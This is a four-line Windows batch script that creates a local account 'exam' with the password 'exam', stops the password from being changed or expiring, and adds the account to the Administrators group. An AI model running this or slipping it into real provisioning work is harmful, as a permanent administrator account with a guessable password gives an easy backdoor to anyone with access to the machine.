@echo off

net user exam exam /passwordchg:no /expires:never /add

net localgroup Administrators exam /add